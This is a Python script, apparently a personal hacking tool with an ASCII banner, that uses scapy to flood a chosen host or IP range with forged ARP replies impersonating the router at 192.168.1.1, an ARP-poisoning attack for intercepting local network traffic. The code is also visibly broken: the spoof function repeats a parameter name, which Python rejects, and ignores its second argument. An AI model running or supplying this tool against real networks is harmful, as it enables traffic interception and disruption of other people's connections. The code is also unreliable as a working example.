import argparse
import scapy.all as scapy
from time import sleep
from termcolor import colored

title = """

  ______   _______   _______          ______   _______    ______    ______   ________ ______  __    __   ______  
 /      \ |       \ |       \        /      \ |       \  /      \  /      \ |        \      \|  \  |  \ /      \ 
|  $$$$$$\| $$$$$$$\| $$$$$$$\      |  $$$$$$\| $$$$$$$\|  $$$$$$\|  $$$$$$\| $$$$$$$$\$$$$$$| $$\ | $$|  $$$$$$\
| $$__| $$| $$__| $$| $$__/ $$      | $$___\$$| $$__/ $$| $$  | $$| $$  | $$| $$__     | $$  | $$$\| $$| $$ __\$$
| $$    $$| $$    $$| $$    $$       \$$    \ | $$    $$| $$  | $$| $$  | $$| $$  \    | $$  | $$$$\ $$| $$|    \
| $$$$$$$$| $$$$$$$\| $$$$$$$        _\$$$$$$\| $$$$$$$ | $$  | $$| $$  | $$| $$$$$    | $$  | $$\$$ $$| $$ \$$$$
| $$  | $$| $$  | $$| $$            |  \__| $$| $$      | $$__/ $$| $$__/ $$| $$      _| $$_ | $$ \$$$$| $$__| $$
| $$  | $$| $$  | $$| $$             \$$    $$| $$       \$$    $$ \$$    $$| $$     |   $$ \| $$  \$$$ \$$    $$
 \$$   \$$ \$$   \$$ \$$              \$$$$$$  \$$        \$$$$$$   \$$$$$$  \$$      \$$$$$$ \$$   \$$  \$$$$$$ 
                                                                                                                 
By: Estefano Zarate 
Github URL: https://github.com/estefanozarate 
"""
router_ip_addr = "192.168.1.1"

def display_title():
	print(colored(title, "blue"))

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Poisoning")
    parser.add_argument("-t", "--target", required = True, dest="ip_address", 
                        help= "Host/IP Range to spoof")
    return parser.parse_args()

def spoof(ip_address, ip_address):
    arp_packet = scapy.ARP(op=2, psrc= router_ip_addr, 
                           pdst=ip_address, hwsrc="aa:bb:cc:44:55:66")
    scapy.send(arp_packet, verbose = False)

def main():
    sleep(1)
    print(colored("ARP-SPOOFING", "yellow"))
    arguments = get_arguments()
    while True:
        spoof(arguments.ip_address, router_ip_addr)
        spoof(router_ip_addr, arguments.ip_address)
        sleep(0.01)
if __name__ == "__main__":
    display_title()
    main()
